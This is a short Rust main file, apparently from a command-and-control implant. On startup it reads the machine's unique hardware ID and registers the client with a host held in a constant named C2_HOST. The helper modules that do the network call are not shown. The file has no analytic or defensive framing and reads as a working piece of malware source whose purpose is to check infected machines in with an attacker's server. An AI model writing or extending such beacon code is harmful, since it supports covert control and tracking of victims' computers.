extern crate machine_uid;

mod constants;
mod utils;

fn main() {
    utils::register_client(constants::C2_HOST, machine_uid::get().unwrap().as_str()).unwrap();
}
